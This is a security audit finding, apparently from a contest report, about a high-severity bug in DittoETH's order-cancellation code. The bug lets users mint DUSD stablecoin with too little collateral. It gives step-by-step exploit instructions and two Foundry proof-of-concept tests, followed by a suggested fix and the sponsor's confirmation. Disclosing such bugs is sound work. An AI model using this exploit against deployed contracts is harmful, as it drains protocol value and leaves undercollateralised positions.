[H-03] Users can mint DUSD with less collateral than required, which gives them free DUSD and may open a liquidatable position
Submitted bynonseodion, also found byserial-coder
Users can mint more DUSD than the value of collateral they provided for the Short Order when they cancel it.
Note: Each number below is a step and some steps jump to other steps.
When a user cancels a short order, the following happens:
If the short’s associated short record has a status ofSR.Closed, i.e. it hasn’t been matched, it is deleted and the process moves to step 5.
LibOrders.sol#L898-L902
if(shortRecord.status==SR.Closed) {// @dev creating shortOrder automatically creates a closed shortRecord which also sets a shortRecordId// @dev cancelling an unmatched order needs to also handle/recycle the shortRecordId❌LibShortRecord.deleteShortRecord(asset,shorter,shortRecordId);}else{
Else, if the short record is partially filled or filled, it is checked if it has less than the minimum erc debt (minShortErc).
LibOrders.sol#L904
if(shortRecord.ercDebt<minShortErc) {
If it has less debt thanminShortErc, the short record is filled up to theminShortErcand its status is changed toSR.FullyFilledand the process moves to step 5.
LibOrders.sol#L905C1-L923
// @dev prevents leaving behind a partially filled SR is under minShortErc// @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErcuint88debtDiff=minShortErc-shortRecord.ercDebt;{STypes.VaultstorageVault=s.vault[vault];uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));❌LibShortRecord.fillShortRecord(asset,shorter,shortRecordId,❌SR.FullyFilled,collateralDiff,debtDiff,Asset.ercDebtRate,Vault.dethYieldRate);
Else, if it has more debt thanminShortErc, the status of the short record is changed toSR.FullyFilled.
LibOrders.sol#L934
shortRecord.status=SR.FullyFilled;
Finally the short order itself is canceled.
LibOrders.sol#L951
cancelOrder(s.shorts,asset,id);
The issue arises in step 3 where it tries to fill the short record up to theminShortErc. To fill the Short Record, it first gets the amount of DUSD needed in line 928 of the code snippet below asdebtDiff. The collateral needed to mint theDUSDis calculated in line 932.
There are two issues with the calculation in line 932:
It uses theshortOrderCRto calculate the collateral needed. If the short order’s collateral ratio is less than 1 ether then the value of the collateral calculated is less than the value of DUSD that eventually gets minted.It uses the short order’s priceshortOrder.priceto calculate the needed collateral. If this price is less than the current price of DUSD in ETH value, the collateral calculated is less than what is required. But if this price is higher than the current price, the user uses more ETH to mint the DUSD.
The short record is filled in line 934, and the collateral needed is removed from the ETH the user initially supplied when he created the short order in line 950. Note that the user (i.e. the shorter) gets thedebtDiff(i.e. DUSD minted) in line 953.
LibOrders.sol#L907-L938
928:uint88debtDiff=minShortErc-shortRecord.ercDebt;929:                 {930:STypes.VaultstorageVault=s.vault[vault];931:932:uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));933:934:LibShortRecord.fillShortRecord(935:asset,936:shorter,937:shortRecordId,938:SR.FullyFilled,939:collateralDiff,940:debtDiff,941:Asset.ercDebtRate,942:Vault.dethYieldRate943:                     );944:945:Vault.dethCollateral+=collateralDiff;946:Asset.dethCollateral+=collateralDiff;947:Asset.ercDebt+=debtDiff;948:949:// @dev update the eth refund amount950:eth-=collateralDiff;951:                 }952:// @dev virtually mint the increased debt953:s.assetUser[asset][shorter].ercEscrowed+=debtDiff;
A malicious user can exploit this by following these steps:
Create a short order on an asset that lets the user provide less than 100% capital.Ensure that the order only gets partially filled before it is added to the market.Cancel the order to mint DUSD for only a part of the collateral and get the minted DUSD.
This will allow him to mint more DUSD than the value of the collateral he provided. The Short Record he leaves is also immediately liquidatable.
Impact
The issues above has the following impacts:
Users can mint more DUSD than the collateral they provide.Users can mint DUSD at a lesser price than the current ETH price.A user can open a position that is immediately liquidatable if he does any of the two actions above.Users can also mint DUSD at a higher price than the current ETH price letting them experience a loss.
Proof of Concept
The POC below can be run in theshorts.t.solfile. It consists of 2 tests:
test_MintFreeDUSDshows how a user can mint DUSD for less collateral than required and open a liquidatable position.test_MintBelowPriceshows how a user can mint DUSD at a lesser price and open a liquidatable position.
// Make sure to import the types below into the Shorts.t.sol file// import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";functiontest_MintFreeDUSD()public{// set the initial, penalty and liquidation CRsvm.startPrank(owner);// set below 200 to allow shorter provide less than 100% of debtdiamond.setInitialCR(asset,170);diamond.setPenaltyCR(asset,120);diamond.setLiquidationCR(asset,150);vm.stopPrank();// create a bid to match the short and change its state to SR.PartialFillfundLimitBidOpt(1ether,0.01ether,receiver);// create the short providing only 70% of the dusd to be minteduint88price=1ether;depositEth(sender,price.mulU88(5000ether).mulU88(0.7ether));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,uint80(price),5000ether,orderHintArray,shortHintArray,70);STypes.ShortRecordmemoryshort=getShortRecord(sender,C.SHORT_STARTING_ID);// successfully matches the bidassertTrue(short.status==SR.PartialFill);// cancel the short to use up collateral provided and mint dusdvm.prank(sender);cancelShort(101);short=getShortRecord(sender,C.SHORT_STARTING_ID);assertEq(short.ercDebt,2000ether);// 2000 dusd mintedassertEq(short.collateral,0.01ether+0.7*2000ether);// 70% of ETH collateral provided// this SR is liquidatableassertGt(diamond.getAssetNormalizedStruct(asset).liquidationCR,short.collateral.div(short.ercDebt.mul(1ether)));}functiontest_MintBelowPrice()public{// create a bid to match the short and change its state to SR.PartialFillfundLimitBidOpt(1ether,0.01ether,receiver);// create the short providing 400% of the dusd to be minted// current initialCR is 500%uint88price=1ether;depositEth(sender,price.mulU88(5000ether).mulU88(4ether));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,uint80(price),5000ether,orderHintArray,shortHintArray,400);STypes.ShortRecordmemoryshort=getShortRecord(sender,C.SHORT_STARTING_ID);assertTrue(short.status==SR.PartialFill);// CR is partially filled by bid// set the new price to 1.5 ether so that price increaseuint256newPrice=1.5ether;skip(15minutes);ethAggregator.setRoundData(92233720368547778907wei,int(newPrice.inv()) /ORACLE_DECIMALS,block.timestamp,block.timestamp,92233720368547778907wei);fundLimitBidOpt(1ether,0.01ether,receiver);assertApproxEqAbs(diamond.getProtocolAssetPrice(asset),newPrice,15000000150);// cancel the short to mint at 1 ether instead of 1.5 ethervm.prank(sender);cancelShort(101);short=getShortRecord(sender,C.SHORT_STARTING_ID);assertEq(short.ercDebt,2000ether);// 2000 dusd minted// 2000 dusd minted for 8000 ether (400% at price of 1 ether)// instead of 12000 ether (400% at price of 1.5 ether)assertEq(short.collateral,0.01ether+4*2000ether);// position is liquidatableassertGt(diamond.getAssetNormalizedStruct(asset).liquidationCR,short.collateral.div(short.ercDebt.mul(1.5ether)));}
Recommended Mitigation Steps
Consider using theinitialCRof the asset if the short order’s CR is lesser and consider using the current oracle price instead of the short order’s price when it was created.
It is also possible that the ETH calculated exceeds the ETH the user provided when he created the Short Order. The sponsor can also consider sourcing more ETH from the user’s escrowed ETH to enable him to cancel when this occurs.
LibOrders.sol#L911-L938
-uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));+uint16cr=shortOrder.shortOrderCR<s.asset[asset].initialCR?s.asset[asset].initialCR:shortOrder.shortOrderCR;+uint80price=LibOracle.getSavedOrSpotOraclePrice(asset);+uint88collateralDiff=price.mulU88(debtDiff).mulU88(LibOrders.convertCR(cr));LibShortRecord.fillShortRecord(asset,shorter,shortRecordId,SR.FullyFilled,collateralDiff,debtDiff,Asset.ercDebtRate,Vault.dethYieldRate);Vault.dethCollateral+=collateralDiff;Asset.dethCollateral+=collateralDiff;Asset.ercDebt+=debtDiff;// @dev update the eth refund amount+if(eth<collateralDiff)revertErrors.InsufficientCollateral();eth-=collateralDiff;
ditto-eth (DittoETH) confirmed